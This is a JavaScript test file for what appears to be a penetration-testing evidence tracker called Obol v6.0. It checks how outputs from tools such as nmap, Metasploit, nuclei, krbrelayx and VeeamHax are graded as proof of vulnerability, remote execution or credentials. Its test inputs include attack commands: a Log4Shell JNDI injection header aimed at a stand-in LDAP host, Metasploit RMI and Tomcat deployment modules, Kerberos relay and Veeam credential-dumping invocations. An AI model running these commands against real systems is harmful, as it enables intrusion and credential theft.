...
test('v6.0 initializes current release state',()=>{
  const s=C.newState();
  assert.strictEqual(C.VERSION,'6.0.0');
  assert.strictEqual(s.obolVersion,'6.0.0');
  assert.strictEqual(s.ui.dashboard60.showReleaseQuality,true);
});

test('v6.0 closes five canonical gaps without denominator drift',()=>{
  assert.strictEqual(O.upstream.commit,'6d16ca0d1434875e0617f2f3cfa825fad0bc7d7e');
  const c=C.mindmapCoverage42(lanes);
  assert.deepStrictEqual([c.implemented,c.partial,c.gap,c.stale,c.coveragePct,c.representedPct],[87,34,6,0,69,95]);
  assert.strictEqual(M.advancedKeys.length,5);
});

test('Build Next remains quality-clean before the six remaining canonical gaps',()=>{
  const q=C.buildNext52(lanes);
  assert.deepStrictEqual([q.implementedQuality,q.mappedDelivery,q.canonicalGaps,q.total],[0,0,6,6]);
  assert(q.rows.every(x=>x.kind==='canonical-gap'));
});

test('all five v6.0 canonical owners are delivery-ready',()=>{
  ...
  for(const id of M.cardIds){const c=card(id);assert(c&&c.evidence45&&c.evidence45.source==='v6.0',id);assert((c.commands||[]).every(x=>!!x.operatorSurface40),id);assert(c.report47&&c.report47.traceable,id);}
});

test('RMI keeps registry, vulnerability, and execution boundaries separate',()=>{
  let p=I.proof60('java-rmi60','nmap -p1099 --script rmi-dumpregistry host','RMI Registry: bound name Foo');
  assert(p.success&&p.facts.includes('service.rmi')&&!p.facts.includes('execution.remote'));
  p=I.proof60('java-rmi60','msfconsole java_rmi_server','Target appears VULNERABLE');
  assert(p.success&&p.facts.includes('vuln.java_rmi')&&!p.facts.includes('execution.remote'));
  p=I.proof60('java-rmi60','msfconsole java_rmi_server','Meterpreter session 2 opened');
  assert(p.success&&p.facts.includes('execution.remote'));
});

test('Log4Shell request transmission alone is not proof',()=>{
  let p=I.proof60('log4shell60','curl -H "User-Agent: ${jndi:ldap://x/OBOL_LOG4J_OK}" https://host','HTTP/1.1 200 OK');
  assert(!p.success&&!p.facts.includes('vuln.log4shell'));
  p=I.proof60('log4shell60','nuclei -id CVE-2021-44228','[CVE-2021-44228] [critical] https://host');
  assert(p.success&&p.facts.includes('vuln.log4shell'));
});

test('Tomcat manager authentication and execution remain distinct',()=>{
  let p=I.proof60('tomcat-jboss60','curl -u u:p https://host/manager/text/list','OK - Listed applications for virtual host');
  assert(p.success&&p.facts.includes('access.web_admin')&&!p.facts.includes('execution.remote'));
  p=I.proof60('tomcat-jboss60','msfconsole tomcat_mgr_deploy','Command shell session 1 opened');
  assert(p.success&&p.facts.includes('execution.remote'));
});

test('Veeam context does not become credentials without explicit material',()=>{
  let p=I.proof60('veeam60','Get-Service Veeam*','VeeamBackupSvc Running');
  assert(p.success&&p.facts.includes('service.veeam')&&!p.facts.includes('credential.reusable'));
  p=I.proof60('veeam60','VeeamHax.exe --target host','Username: lab\\backup Password: TrainingOnly123!');
  assert(p.success&&p.facts.includes('credential.reusable'));
});

test('Kerberos relay keeps relay and ticket material below privilege',()=>{
  let p=I.proof60('kerberos-relay60','python3 krbrelayx.py -t ldaps://dc','Successfully relayed authentication');
  assert(p.success&&p.facts.includes('relay.kerberos')&&!p.facts.includes('access.system'));
  p=I.proof60('kerberos-relay60','python3 krbrelayx.py -t http://ca','ticket saved to admin.ccache');
  assert(p.success&&p.facts.includes('kerberos.tickets')&&!p.facts.includes('access.admin'));
});

test('dashboard exposes v6.0 progress and release quality',()=>{
  const d=C.northStarDashboard60(C.newState(),lanes);
  assert.strictEqual(d.canonicalAdvance60.toImplemented,87);
  assert.strictEqual(d.gapWave60.remainingGaps,6);
  assert.strictEqual(d.releaseQuality60.clean,true);
  assert(d.milestones.some(x=>x.release==='v6.0'&&x.implemented===87));
...
test('release PR validator accepts v6.0 contract and rejects wrong branch',()=>{
  ...
  const eventPath=path.join(os.tmpdir(),'obol-v60-pr-event.json');
  const goodBody='## Summary\n'+('Release summary. '.repeat(50))+'\n## Canonical methodology accounting\n87/127.\n## Conservative Evidence boundaries\nProof stays bounded.\n## Release wiring\nWired.\n## Regression coverage\nCovered.\n## Compatibility\nCompatible.';
  fs.writeFileSync(eventPath,JSON.stringify({pull_request:{head:{ref:'release/obol-v6.0'},title:'Obol v6.0 — canonical gap reduction',body:goodBody}}));
  ...
  assert.strictEqual(r.status,0,r.stderr||r.stdout);
  fs.writeFileSync(eventPath,JSON.stringify({pull_request:{head:{ref:'build/obol-v6.0'},title:'Obol v6.0 — wrong branch',body:goodBody}}));
...
test('live CI event satisfies the release PR contract',()=>{
  const r=cp.spawnSync(process.execPath,[path.join(root,'tools','validate-release-pr.js')],{cwd:root,env:process.env,encoding:'utf8'});
  assert.strictEqual(r.status,0,r.stderr||r.stdout);
});
...
test('sanitized export advances to v6.0 while retaining secret redaction',()=>{
  const s=C.newState();
  C.addTypedArtifact(s,'secrets','DoNotExport!',{});
  const safe=C.sanitizedCopy(s);
  assert.strictEqual(safe.obolVersion,'6.0.0');
